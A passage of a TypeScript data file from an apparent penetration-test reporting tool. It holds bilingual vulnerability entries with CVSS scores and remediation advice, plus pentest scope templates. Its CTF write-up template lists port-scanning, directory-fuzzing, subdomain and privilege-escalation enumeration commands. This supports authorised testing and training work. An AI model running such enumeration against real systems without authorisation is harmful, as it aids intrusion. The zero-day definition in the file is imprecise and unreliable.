      cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
      overview_en: "### Overview\nWebSockets can be vulnerable to issues like Cross-Site WebSocket Hijacking (CSWSH), lack of authentication/authorization, and injection attacks.",
      overview_es: "### Resumen\nLos WebSockets pueden ser vulnerables a problemas como el secuestro de WebSocket entre sitios (CSWSH), la falta de autenticación/autorización y los ataques de inyección.",
      technicalDescription_en: "### Technical Description\nCSWSH is similar to CSRF but for WebSockets. An attacker can create a malicious website that initiates a WebSocket connection to the vulnerable application from the victim's browser. Other issues include failing to authenticate messages sent over the WebSocket, leading to impersonation.",
      technicalDescription_es: "### Descripción Técnica\nCSWSH es similar a CSRF pero para WebSockets. Un atacante puede crear un sitio web malicioso que inicia una conexión WebSocket a la aplicación vulnerable desde el navegador de la víctima. Otros problemas incluyen no autenticar los mensajes enviados a través del WebSocket, lo que lleva a la suplantación.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the WebSocket endpoint and the specific vulnerability.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el endpoint de WebSocket y la vulnerabilidad específica.]",
      impact_en: "### Impact\nThis can lead to unauthorized actions, data leakage, and other attacks.",
      impact_es: "### Impacto\nEsto puede llevar a acciones no autorizadas, fuga de datos y otros ataques.",
      recommendations_en: "### Recommendations\nValidate the `Origin` header for all WebSocket handshakes. Implement a token-based authentication mechanism for WebSocket messages. Sanitize all data sent over the WebSocket.",
      recommendations_es: "### Recomendaciones\nValidar la cabecera `Origin` para todos los saludos de WebSocket. Implementar un mecanismo de autenticación basado en tokens para los mensajes de WebSocket. Desinfectar todos los datos enviados a través del WebSocket.",
      references: ["https://portswigger.net/web-security/websockets"],
      tags: ["Additional", "WebSocket"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-096",
      title_en: "Mobile Root/Jailbreak Detection Bypass",
      title_es: "Omisión de Detección de Root/Jailbreak",
      cwe: "CWE-284",
      severity: "Medium",
      cvss: { score: 5.3, vectorString: "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N", attackVector: "L", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "L", integrity: "L", availability: "N" },
      overview_en: "### Overview\nThe application attempts to detect if it is running on a rooted or jailbroken device, but this detection can be bypassed.",
      overview_es: "### Resumen\nLa aplicación intenta detectar si se está ejecutando en un dispositivo rooteado o con jailbreak, pero esta detección se puede eludir.",
      technicalDescription_en: "### Technical Description\nAn attacker can use tools like Frida or Objection to hook the application's functions and bypass the root/jailbreak detection checks. This allows the attacker to use advanced reverse engineering and dynamic analysis tools.",
      technicalDescription_es: "### Descripción Técnica\nUn atacante puede usar herramientas como Frida u Objection para enganchar las funciones de la aplicación y eludir las comprobaciones de detección de root/jailbreak. Esto permite al atacante utilizar herramientas avanzadas de ingeniería inversa y análisis dinámico.",
      affectedComponents_en: "### Affected Components\n[TODO: Describe the root detection mechanism and how it was bypassed.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Describir el mecanismo de detección de root y cómo se eludió.]",
      impact_en: "### Impact\nBypassing root detection facilitates further attacks, such as reverse engineering, tampering, and data extraction.",
      impact_es: "### Impacto\nEludir la detección de root facilita otros ataques, como la ingeniería inversa, la manipulación y la extracción de datos.",
      recommendations_en: "### Recommendations\nImplement multiple, layered root detection checks. Use server-side checks where possible. Note that client-side root detection can always be bypassed by a determined attacker.",
      recommendations_es: "### Recomendaciones\nImplementar múltiples comprobaciones de detección de root en capas. Usar comprobaciones del lado del servidor siempre que sea posible. Tener en cuenta que la detección de root del lado del cliente siempre puede ser eludida por un atacante decidido.",
      references: ["https://owasp.org/www-project-mobile-top-10/2016-risks/m8-code-tampering"],
      tags: ["Mobile", "Bypass"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-097",
      title_en: "Insecure Deep Links",
      title_es: "Enlaces Profundos Inseguros",
      cwe: "CWE-939",
      severity: "Medium",
      cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
      overview_en: "### Overview\nThe mobile application's deep links are insecurely configured, allowing a malicious app to intercept sensitive data or perform unauthorized actions.",
      overview_es: "### Resumen\nLos enlaces profundos de la aplicación móvil están configurados de forma insegura, lo que permite que una aplicación maliciosa intercepte datos sensibles o realice acciones no autorizadas.",
      technicalDescription_en: "### Technical Description\nThe application registers a custom URL scheme (e.g., `myapp://`) that can be invoked by other apps. If the handling of this deep link is insecure, a malicious app could craft a URL to steal data or trigger sensitive functionality.",
      technicalDescription_es: "### Descripción Técnica\nLa aplicación registra un esquema de URL personalizado (p. ej., `myapp://`) que puede ser invocado por otras aplicaciones. Si el manejo de este enlace profundo es inseguro, una aplicación maliciosa podría crear una URL para robar datos o desencadenar una funcionalidad sensible.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the insecure deep link scheme and the vulnerable functionality.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el esquema de enlace profundo inseguro y la funcionalidad vulnerable.]",
      impact_en: "### Impact\nThis can lead to information disclosure, account takeover, or other vulnerabilities depending on the functionality exposed via the deep link.",
      impact_es: "### Impacto\nEsto puede llevar a la divulgación de información, la toma de control de cuentas u otras vulnerabilidades dependiendo de la funcionalidad expuesta a través del enlace profundo.",
      recommendations_en: "### Recommendations\nValidate all parameters passed through deep links. Prompt the user for confirmation before performing any sensitive actions. Use App Links (Android) or Universal Links (iOS) to ensure that only your app can handle links to your domain.",
      recommendations_es: "### Recomendaciones\nValidar todos los parámetros pasados a través de enlaces profundos. Solicitar confirmación al usuario antes de realizar cualquier acción sensible. Usar App Links (Android) o Universal Links (iOS) para garantizar que solo su aplicación pueda manejar los enlaces a su dominio.",
      references: ["https://developer.android.com/training/app-links"],
      tags: ["Mobile", "Deep Link"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-098",
      title_en: "Mobile App Cloning",
      title_es: "Clonación de Aplicaciones Móviles",
      cwe: "CWE-912",
      severity: "Medium",
      cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
      overview_en: "### Overview\nAn attacker can clone the mobile application, repackage it with malicious code, and distribute it to trick users into installing the malicious version.",
      overview_es: "### Resumen\nUn atacante puede clonar la aplicación móvil, reempaquetarla con código malicioso y distribuirla para engañar a los usuarios para que instalen la versión maliciosa.",
      technicalDescription_en: "### Technical Description\nWithout proper code integrity checks, an attacker can easily decompile, modify, and recompile the application. This is particularly easy on Android. The malicious version can be used to steal credentials, intercept data, or perform other malicious actions.",
      technicalDescription_es: "### Descripción Técnica\nSin las comprobaciones de integridad de código adecuadas, un atacante puede descompilar, modificar y recompilar fácilmente la aplicación. Esto es particularmente fácil en Android. La versión maliciosa se puede usar para robar credenciales, interceptar datos o realizar otras acciones maliciosas.",
      affectedComponents_en: "### Affected Components\n[TODO: The application binary itself.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: El propio binario de la aplicación.]",
      impact_en: "### Impact\nThis can lead to widespread fraud and data theft from users who install the malicious version.",
      impact_es: "### Impacto\nEsto puede llevar a un fraude generalizado y al robo de datos de los usuarios que instalan la versión maliciosa.",
      recommendations_en: "### Recommendations\nImplement code integrity checks (e.g., checksum validation) and certificate pinning. Use app shielding and hardening solutions. Educate users to only download the app from official app stores.",
      recommendations_es: "### Recomendaciones\nImplementar comprobaciones de integridad de código (p. ej., validación de suma de verificación) y anclaje de certificados. Usar soluciones de protección y fortalecimiento de aplicaciones. Educar a los usuarios para que solo descarguen la aplicación de las tiendas de aplicaciones oficiales.",
      references: ["https://owasp.org/www-project-mobile-top-10/2016-risks/m8-code-tampering"],
      tags: ["Mobile", "Tampering"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-099",
      title_en: "TCP/IP Vulnerabilities",
      title_es: "Vulnerabilidades TCP/IP",
      cwe: "CWE-16",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nVulnerabilities in the underlying TCP/IP stack of the operating system can be exploited to cause denial of service or other impacts.",
      overview_es: "### Resumen\nLas vulnerabilidades en la pila TCP/IP subyacente del sistema operativo pueden ser explotadas para causar una denegación de servicio u otros impactos.",
      technicalDescription_en: "### Technical Description\nThis covers a broad range of vulnerabilities in the implementation of TCP, IP, ICMP, and other network protocols. Examples include SYN floods, IP fragmentation attacks, and teardrop attacks.",
      technicalDescription_es: "### Descripción Técnica\nEsto cubre una amplia gama de vulnerabilidades en la implementación de TCP, IP, ICMP y otros protocolos de red. Los ejemplos incluyen inundaciones SYN, ataques de fragmentación de IP y ataques de lágrima.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the operating system and the specific TCP/IP vulnerability.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el sistema operativo y la vulnerabilidad TCP/IP específica.]",
      impact_en: "### Impact\nThis can lead to denial of service, making the system unavailable.",
      impact_es: "### Impacto\nEsto puede llevar a una denegación de servicio, haciendo que el sistema no esté disponible.",
      recommendations_en: "### Recommendations\nKeep the operating system and network devices patched. Use a firewall and an Intrusion Detection/Prevention System (IDS/IPS) to block malicious traffic patterns.",
      recommendations_es: "### Recomendaciones\nMantener el sistema operativo y los dispositivos de red parcheados. Usar un cortafuegos y un Sistema de Detección/Prevención de Intrusiones (IDS/IPS) para bloquear patrones de tráfico maliciosos.",
      references: ["https://en.wikipedia.org/wiki/TCP/IP_model"],
      tags: ["Network", "TCP/IP"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-100",
      title_en: "Zero-Day Exploits",
      title_es: "Exploits de Día Cero",
      cwe: "CWE-937",
      severity: "Critical",
      cvss: { score: 10.0, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "C", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nA zero-day vulnerability is a software security flaw that is known to the software vendor but doesn't have a patch in place to fix the flaw. It has a high chance of being successfully exploited by attackers.",
      overview_es: "### Resumen\nUna vulnerabilidad de día cero es un fallo de seguridad de software que es conocido por el proveedor del software pero que no tiene un parche para corregir el fallo. Tiene una alta probabilidad de ser explotada con éxito por los atacantes.",
      technicalDescription_en: "### Technical Description\nThis represents a vulnerability that was unknown prior to the assessment and for which no patch exists. The technical details will be specific to the discovered vulnerability.",
      technicalDescription_es: "### Descripción Técnica\nEsto representa una vulnerabilidad que era desconocida antes de la evaluación y para la cual no existe ningún parche. Los detalles técnicos serán específicos de la vulnerabilidad descubierta.",
      affectedComponents_en: "### Affected Components\n[TODO: Describe the zero-day vulnerability in detail.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Describir la vulnerabilidad de día cero en detalle.]",
      impact_en: "### Impact\nThe impact is typically critical, leading to full system compromise.",
      impact_es: "### Impacto\nEl impacto suele ser crítico, lo que lleva a un compromiso total del sistema.",
      recommendations_en: "### Recommendations\nWork with the vendor to develop a patch. In the interim, implement compensating controls, such as network segmentation, enhanced monitoring, and access restrictions, to mitigate the risk.",
      recommendations_es: "### Recomendaciones\nTrabajar con el proveedor para desarrollar un parche. Mientras tanto, implementar controles de compensación, como la segmentación de la red, la monitorización mejorada y las restricciones de acceso, para mitigar el riesgo.",
      references: ["https://www.cisa.gov/stopransomware/understanding-and-responding-zero-day-exploits"],
      tags: ["Additional", "Zero-Day"],
      ...emptyVulnBoilerplate
    }
];

export const projectTemplates: ProjectTemplate[] = [
  {
    id: 'ptpl-1',
    name_en: 'Standard Web App Pentest',
    name_es: 'Pentest Estándar de Aplicación Web',
    description_en: 'A comprehensive security assessment for web applications, covering OWASP Top 10 and other common vulnerabilities.',
    description_es: 'Una evaluación de seguridad completa para aplicaciones web, cubriendo el OWASP Top 10 y otras vulnerabilidades comunes.',
    icon: 'Scan',
    scope_en: `## Scope
- **Application URL:** [TODO: Add application URL, e.g., https://example.com]
- **Testing Period:** [TODO Start Date] to [TODO End Date]
- **Credentials:** [TODO: Specify credentials if provided, e.g., user, admin]
- **Exclusions:** [TODO: Specify any out-of-scope targets, e.g., *.blog.example.com]

## Methodology
The assessment will follow a standard web application penetration testing methodology, including:
1.  **Reconnaissance:** Information gathering about the application and infrastructure.
2.  **Automated Scanning:** Using tools to identify low-hanging fruit.
3.  **Manual Testing:** In-depth testing for complex vulnerabilities such as business logic flaws, access control issues, and injection attacks.
4.  **Reporting:** Documentation of findings and remediation recommendations.`,
    scope_es: `## Alcance
- **URL de la Aplicación:** [TODO: Añadir URL de la aplicación, p.ej., https://ejemplo.com]
- **Periodo de Pruebas:** [TODO Start Date] a [TODO End Date]
- **Credenciales:** [TODO: Especificar credenciales si se proporcionaron, p.ej., usuario, administrador]
- **Exclusiones:** [TODO: Especificar objetivos fuera de alcance, p.ej., *.blog.ejemplo.com]

## Metodología
La evaluación seguirá una metodología estándar de pruebas de penetración de aplicaciones web, que incluye:
1.  **Reconocimiento:** Recopilación de información sobre la aplicación y la infraestructura.
2.  **Escaneo Automatizado:** Uso de herramientas para identificar vulnerabilidades de bajo esfuerzo.
3.  **Pruebas Manuales:** Pruebas en profundidad para vulnerabilidades complejas como fallos de lógica de negocio, problemas de control de acceso y ataques de inyección.
4.  **Informe:** Documentación de hallazgos y recomendaciones de remediación.`,
    appendix_en: `### Appendix
A combination of automated tools and manual techniques were used to perform this assessment.
- **Proxy:** Burp Suite Professional
- **Scanners:** Nessus, Nuclei
- **Reconnaissance:** Amass, Subfinder`,
    appendix_es: `### Apéndice
Se utilizó una combinación de herramientas automatizadas y técnicas manuales para realizar esta evaluación.
- **Proxy:** Burp Suite Professional
- **Escáneres:** Nessus, Nuclei
- **Reconocimiento:** Amass, Subfinder`
  },
  {
    id: 'ptpl-2',
    name_en: 'Internal Network Assessment',
    name_es: 'Evaluación de Red Interna',
    description_en: 'An assessment of the internal network to identify misconfigurations, vulnerable services, and pathways for lateral movement.',
    description_es: 'Una evaluación de la red interna para identificar configuraciones incorrectas, servicios vulnerables y vías para el movimiento lateral.',
    icon: 'Network',
    scope_en: `## Scope
- **IP Ranges:** [TODO: Add IP ranges, e.g., 192.168.1.0/24]
- **Testing Period:** [TODO Start Date] to [TODO End Date]
- **Assumptions:** The assessment is performed from the perspective of an attacker who has gained a foothold on the internal network (e.g., a compromised workstation).
- **Exclusions:** [TODO: Specify any out-of-scope systems]

## Methodology
1.  **Network Discovery:** Identifying live hosts and open ports.
2.  **Service Enumeration:** Fingerprinting services running on discovered ports.
3.  **Vulnerability Scanning:** Scanning for known vulnerabilities in identified services.
4.  **Manual Exploitation:** Attempting to exploit vulnerabilities to gain further access.
5.  **Active Directory Analysis:** Looking for misconfigurations in Active Directory, such as weak passwords, kerberoasting opportunities, and privilege escalation paths.
6.  **Reporting:** Documenting findings and remediation recommendations.`,
    scope_es: `## Alcance
- **Rangos IP:** [TODO: Añadir rangos IP, p.ej., 192.168.1.0/24]
- **Periodo de Pruebas:** [TODO Start Date] a [TODO End Date]
- **Supuestos:** La evaluación se realiza desde la perspectiva de un atacante que ha obtenido un punto de apoyo en la red interna (p.ej., una estación de trabajo comprometida).
- **Exclusiones:** [TODO: Especificar sistemas fuera de alcance]

## Metodología
1.  **Descubrimiento de Red:** Identificación de hosts activos y puertos abiertos.
2.  **Enumeración de Servicios:** Identificación de los servicios que se ejecutan en los puertos descubiertos.
3.  **Escaneo de Vulnerabilidades:** Búsqueda de vulnerabilidades conocidas en los servicios identificados.
4.  **Explotación Manual:** Intento de explotar vulnerabilidades para obtener más acceso.
5.  **Análisis de Active Directory:** Búsqueda de configuraciones incorrectas en Active Directory, como contraseñas débiles, oportunidades de kerberoasting y rutas de escalada de privilegios.
6.  **Informe:** Documentación de hallazgos y recomendaciones de remediación.`,
    appendix_en: `### Appendix
- **Network Scanner:** Nmap, Masscan
- **Vulnerability Scanner:** Nessus
- **Active Directory:** BloodHound, Impacket
- **Manual Exploitation:** Metasploit Framework, CrackMapExec`,
    appendix_es: `### Apéndice
- **Escáner de Red:** Nmap, Masscan
- **Escáner de Vulnerabilidades:** Nessus
- **Active Directory:** BloodHound, Impacket
- **Explotación Manual:** Metasploit Framework, CrackMapExec`
  },
  {
    id: 'ptpl-3',
    name_en: 'Mobile App Pentest (iOS/Android)',
    name_es: 'Pentest de Aplicación Móvil (iOS/Android)',
    description_en: 'A security assessment of an iOS or Android mobile application, focusing on client-side vulnerabilities and backend API security.',
    description_es: 'Una evaluación de seguridad de una aplicación móvil de iOS o Android, centrada en vulnerabilidades del lado del cliente y seguridad de la API de backend.',
    icon: 'Smartphone',
    scope_en: `## Scope
- **Application:** [TODO: Add application name and package/bundle ID]
- **Platform:** iOS / Android
- **Testing Period:** [TODO Start Date] to [TODO End Date]
- **Backend APIs:** [TODO: List backend API endpoints in scope]

## Methodology
The assessment includes both static and dynamic analysis of the mobile application.
1.  **Static Analysis (SAST):** Analyzing the application binary to find hardcoded secrets, insecure configurations, and other weaknesses without running the code.
2.  **Dynamic Analysis (DAST):** Running the application on a test device (rooted/jailbroken) to analyze its runtime behavior, including:
    -   Network traffic analysis (MitM).
    -   Insecure data storage checks.
    -   IPC endpoint analysis.
    -   Runtime manipulation with Frida.
3.  **API Testing:** Testing the backend APIs for common web vulnerabilities (OWASP API Top 10).
4.  **Reporting:** Documentation of findings and remediation recommendations.`,
    scope_es: `## Alcance
- **Aplicación:** [TODO: Añadir nombre de la aplicación y ID del paquete/bundle]
- **Plataforma:** iOS / Android
- **Periodo de Pruebas:** [TODO Start Date] a [TODO End Date]
- **APIs de Backend:** [TODO: Listar endpoints de API de backend en el alcance]

## Metodología
La evaluación incluye tanto el análisis estático como el dinámico de la aplicación móvil.
1.  **Análisis Estático (SAST):** Análisis del binario de la aplicación para encontrar secretos embebidos, configuraciones inseguras y otras debilidades sin ejecutar el código.
2.  **Análisis Dinámico (DAST):** Ejecución de la aplicación en un dispositivo de prueba (rooteado/con jailbreak) para analizar su comportamiento en tiempo de ejecución, incluyendo:
    -   Análisis del tráfico de red (MitM).
    -   Comprobaciones de almacenamiento de datos inseguro.
    -   Análisis de endpoints IPC.
    -   Manipulación en tiempo de ejecución con Frida.
3.  **Pruebas de API:** Pruebas de las API de backend para vulnerabilidades web comunes (OWASP API Top 10).
4.  **Informe:** Documentación de hallazgos y recomendaciones de remediación.`,
    appendix_en: `### Appendix
- **Static Analysis:** MobSF, jadx
- **Dynamic Analysis:** Burp Suite, Frida, Objection
- **Test Devices:** Google Pixel 6 (Rooted), iPhone 12 (Jailbroken)`,
    appendix_es: `### Apéndice
- **Análisis Estático:** MobSF, jadx
- **Análisis Dinámico:** Burp Suite, Frida, Objection
- **Dispositivos de Prueba:** Google Pixel 6 (Rooteado), iPhone 12 (con Jailbreak)`
  },
  {
    id: 'ptpl-4',
    name_en: 'Certification Report',
    name_es: 'Informe de Certificación',
    description_en: 'A generic and professional template for offensive security certification reports (e.g., OSCP, CPTS). Includes all necessary sections for a complete report.',
    description_es: 'Una plantilla genérica y profesional para informes de certificaciones de seguridad ofensiva (p. ej., OSCP, CPTS). Incluye todas las secciones necesarias para un informe completo.',
    icon: 'Award',
    scope_en: `## Introduction
This report documents the results of the simulated penetration test performed in the [TODO: Certification Name] exam environment.

## Objective
The objective was to perform a penetration test, identifying and exploiting vulnerabilities to gain unauthorized access to target systems and achieve the exam objectives.

## Scope
- **Target Network:** [TODO: e.g., 10.10.10.0/24]
- **Exam Duration:** [TODO Start Date] to [TODO End Date]`,
    scope_es: `## Introducción
Este informe documenta los resultados de la prueba de penetración simulada realizada en el entorno del examen [TODO: Nombre de la Certificación].

## Objetivo
El objetivo fue realizar una prueba de penetración, identificando y explotando vulnerabilidades para obtener acceso no autorizado a los sistemas objetivo y cumplir los objetivos del examen.

## Alcance
- **Red Objetivo:** [TODO: p. ej., 10.10.10.0/24]
- **Duración del Examen:** [TODO Start Date] a [TODO End Date]`,
    appendix_en: `### Appendix
| Hostname / IP | Location | Value |
|---|---|---|
| [TODO: Hostname/IP] | [TODO: e.g., /root/proof.txt] | [TODO: Flag Value] |
`,
    appendix_es: `### Apéndice
| Hostname / IP | Ubicación | Valor |
|---|---|---|
| [TODO: Hostname/IP] | [TODO: p. ej., /root/proof.txt] | [TODO: Valor de la Bandera] |
`
  },
  {
    id: 'ptpl-5',
    name_en: 'Machine Writeup',
    name_es: 'Writeup de Máquina',
    description_en: 'A template for documenting the process of solving a CTF machine, such as those on Hack The Box.',
    description_es: 'Una plantilla para documentar el proceso de resolución de una máquina CTF, como las de Hack The Box.',
    icon: 'FileText',
    scope_en: `## General Information
- **Machine Name:** [TODO: Machine Name]
- **IP Address:** [TODO: IP Address]
- **Operating System:** Linux
- **Difficulty:** [TODO: Select Difficulty]
- **Date:** ${format(new Date(), 'dd-MM-yyyy')}

---

## Initial Reconnaissance

### Add IP to /etc/hosts
\`\`\`bash
echo "[TODO: IP Address] [TODO: machine.htb]" | sudo tee -a /etc/hosts
\`\`\`

### Port Scanning (Nmap)

#### Simple Scan
\`\`\`bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn [TODO: IP Address]
\`\`\`

#### Advanced Scan
\`\`\`bash
sudo nmap -sCV -p22,80 [TODO: IP Address] -oN targeted
\`\`\`
*Result: Found ports 22 (SSH) and 80 (HTTP) open.*

---

## Web Enumeration

### Initial Access & Analysis
- **URL:** \`http://[TODO: machine.htb]\`
- **Useful Commands:**
  \`\`\`bash
  # Check DNS
  host [TODO: machine.htb]
  dig [TODO: machine.htb]
  
  # Check headers
  curl -I http://[TODO: machine.htb]
  
  # Web technology identification
  whatweb -a3 -v http://[TODO: machine.htb]
  
  # Check common ports
  netcat -vz [TODO: machine.htb] 1-1000
  \`\`\`

### Directory Fuzzing
\`\`\`bash
# Using dirsearch
dirsearch -u http://[TODO: machine.htb] -x 403,404

# Using gobuster
gobuster dir -u http://[TODO: machine.htb] -w /usr/share/wordlists/dirb/common.txt

# Using ffuf
ffuf -u http://[TODO: machine.htb]/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
\`\`\`
*Found directories: [TODO: List found directories like /about.php, /contact.php]*

### Subdomain Enumeration (VHosts)
Check for different response sizes to identify potential virtual hosts.
\`\`\`bash
# Fuzz for subdomains using ffuf and filter by response size
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://[TODO: machine.htb]/ -H 'Host: FUZZ.[TODO: machine.htb]' -fs [TODO: base_response_size]
\`\`\`
*Found subdomain: [TODO: e.g., grafana.planning.htb]. Added to /etc/hosts.*

---

## Exploitation

### Vulnerability Research
*Identified Service/Version: [TODO: e.g., Grafana v11.0.0]*
- Searched for exploits on:
  - https://exploit-db.com
  - https://sploitus.com
  - GitHub
- **Selected Exploit:** [TODO: Describe the selected exploit and its reference URL]

### Exploit Execution
[TODO: Step-by-step description of how the exploit was executed to gain initial access.]

---

## Initial Access
- **User:** \`whoami\` -> [TODO: user]
- **Environment:** \`uname -a\`, \`id\`, \`sudo -l\`

### User Flag
- **Command:** \`cat /home/[TODO: user]/user.txt\`

---

## Privilege Escalation

### Enumeration
- **Check sudo permissions:** \`sudo -l\`
- **Find SUID/GUID files:**
  \`\`\`bash
  find / -user root -perm -4000 -print 2>/dev/null
  \`\`\`
- **Check running services:** \`ss -tuln\`
- **Automated enumeration scripts:** \`linpeas.sh\`, \`pspy\`

### Applied Technique
[TODO: Describe the technique used: SUID binary, misconfigured cronjob, hardcoded credentials, etc.]

---

## 👑 Root Flag
- **Command:** \`cat /root/root.txt\`
`,
    scope_es: `## Información General
- **Nombre de la máquina:** [TODO: Nombre de la máquina]
- **Dirección IP:** [TODO: Dirección IP]
- **Sistema Operativo:** Linux
- **Dificultad:** [TODO: Seleccionar Dificultad]
- **Fecha:** ${format(new Date(), 'dd-MM-yyyy')}

---

## Reconocimiento Inicial

### Añadir IP a /etc/hosts
\`\`\`bash
echo "[TODO: Dirección IP] [TODO: maquina.htb]" | sudo tee -a /etc/hosts
\`\`\`

### Escaneo de Puertos (Nmap)

#### Escaneo Simple
\`\`\`bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn [TODO: Dirección IP]
\`\`\`

#### Escaneo Avanzado
\`\`\`bash
sudo nmap -sCV -p22,80 [TODO: Dirección IP] -oN targeted
\`\`\`
*Resultado: Se encontraron los puertos 22 (SSH) y 80 (HTTP) abiertos.*

---

## Enumeración Web

### Acceso y Análisis Inicial
- **URL:** \`http://[TODO: maquina.htb]\`
- **Comandos útiles:**
  \`\`\`bash
  # Comprobar DNS
  host [TODO: maquina.htb]
  dig [TODO: maquina.htb]
  
  # Comprobar cabeceras
  curl -I http://[TODO: maquina.htb]
  
  # Identificación de tecnología web
  whatweb -a3 -v http://[TODO: maquina.htb]
  
  # Comprobar puertos comunes
  netcat -vz [TODO: maquina.htb] 1-1000
  \`\`\`

### Fuzzing de Directorios
\`\`\`bash
# Usando dirsearch
dirsearch -u http://[TODO: maquina.htb] -x 403,404

# Usando gobuster
gobuster dir -u http://[TODO: maquina.htb] -w /usr/share/wordlists/dirb/common.txt

# Usando ffuf
ffuf -u http://[TODO: maquina.htb]/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
\`\`\`
*Directorios encontrados: [TODO: Listar directorios como /about.php, /contact.php]*

### Enumeración de Subdominios (VHosts)
Comprobar diferentes tamaños de respuesta para identificar posibles hosts virtuales.
\`\`\`bash
# Fuzzing de subdominios con ffuf y filtrado por tamaño de respuesta
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://[TODO: maquina.htb]/ -H 'Host: FUZZ.[TODO: maquina.htb]' -fs [TODO: tamaño_respuesta_base]
\`\`\`
*Subdominio encontrado: [TODO: p.ej., grafana.planning.htb]. Añadido a /etc/hosts.*

---

## Explotación

### Investigación de Vulnerabilidades
*Servicio/Versión Identificado: [TODO: p.ej., Grafana v11.0.0]*
- Búsqueda de exploits en:
  - https://exploit-db.com
  - https://sploitus.com
  - GitHub
- **Exploit Seleccionado:** [TODO: Describir el exploit usado y su URL de referencia]

### Ejecución del Exploit
[TODO: Descripción paso a paso de cómo se ejecutó el exploit para obtener acceso inicial.]

---

## Acceso Inicial
- **Usuario:** \`whoami\` -> [TODO: usuario]
- **Entorno:** \`uname -a\`, \`id\`, \`sudo -l\`

### Bandera de Usuario (User Flag)
- **Comando:** \`cat /home/[TODO: usuario]/user.txt\`

---

## Escalada de Privilegios

### Enumeración
- **Comprobar permisos de sudo:** \`sudo -l\`
- **Buscar archivos SUID/GUID:**
  \`\`\`bash
  find / -user root -perm -4000 -print 2>/dev/null
  \`\`\`
- **Ver servicios en ejecución:** \`ss -tuln\`
- **Scripts de enumeración automatizada:** \`linpeas.sh\`, \`pspy\`

### Técnica Aplicada
[TODO: Describir la técnica usada: binario SUID, cronjob mal configurado, credenciales hardcoded, etc.]

---

## 👑 Root Flag
- **Comando:** \`cat /root/root.txt\`
`,
    appendix_en: `### Appendix
- **Network Scanner:** Nmap
- **Web Fuzzer:** ffuf, dirsearch
- **Exploitation:** [TODO: e.g., Metasploit, Python script]
- **Privilege Escalation:** linpeas.sh`,
    appendix_es: `### Apéndice
- **Escáner de Red:** Nmap
- **Fuzzer Web:** ffuf, dirsearch
- **Explotación:** [TODO: p. ej., Metasploit, script de Python]
- **Escalada de Privilegios:** linpeas.sh`
  },
];

  

